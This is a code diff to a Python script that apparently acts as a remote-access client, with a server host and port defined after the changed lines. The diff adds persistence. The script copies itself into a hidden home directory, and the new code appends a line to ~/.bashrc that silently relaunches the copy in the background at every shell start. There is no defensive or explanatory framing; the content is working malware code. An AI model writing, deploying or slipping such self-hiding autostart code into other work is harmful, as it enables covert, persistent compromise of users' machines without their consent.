@@ -9,20 +9,39 @@ import shutil
 
 def first_time():
     # get the path of the current script
-    current_script_path = os.path.realpath(__file__)
+    try:
+        current_script_path = os.path.realpath(__file__)
 
-    # the directory where the script will be copied
-    copy_directory = os.path.expanduser("~/.hidden_directory")
+        # the directory where the script will be copied
+        copy_directory = os.path.expanduser("~/.hidden_directory")
 
-    # create the directory if it does not exist
-    os.makedirs(copy_directory, exist_ok=True)
+        # create the directory if it does not exist
+        os.makedirs(copy_directory, exist_ok=True)
 
-    # the path of the copied script
-    copy_script_path = os.path.join(copy_directory, "example.py")
+        # the path of the copied script
+        copy_script_path = os.path.join(copy_directory, "example.py")
 
-    # copy the script
-    shutil.copy2(current_script_path, copy_script_path)
-first_time()
+        # copy the script
+        shutil.copy2(current_script_path, copy_script_path)
+        return True
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return False
+if first_time():
+    # create the command to add to .bashrc
+    command_to_add = f"python3 ~/.hidden_directory/example.py &"
+    # path to the .bashrc file
+    bashrc_path = os.path.expanduser("~/.bashrc")
+    try:
+        # open the .bashrc file in append mode
+        with open(bashrc_path, "a") as file:
+            # write the command to the .bashrc file
+            file.write("\n" + command_to_add + "\n")
+        # set the output to success message
+        output = "Command added to .bashrc successfully!"
+    except Exception as e:
+        # if there's an error, set the output to the error message
+        output = str(e)
 
 SERVER_HOST = "192.168.1.17"
 SERVER_PORT = 5003
